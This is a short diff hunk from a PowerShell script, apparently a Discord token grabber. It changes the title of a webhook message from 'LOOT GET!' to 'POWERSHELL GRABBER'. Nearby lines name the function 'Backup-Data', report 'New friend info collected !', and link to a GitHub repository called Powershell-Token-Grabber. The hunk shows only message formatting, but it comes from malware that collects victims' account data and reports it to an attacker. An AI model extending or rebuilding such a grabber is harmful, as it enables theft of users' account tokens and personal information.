@@ -668,7 +668,7 @@ function Backup-Data {
 	"url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
             @{
-                "title" = "LOOT GET!"
+                "title" = "POWERSHELL GRABBER"
 		"url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                 "description" = "New friend info collected !"
                 "color" = "3447003"
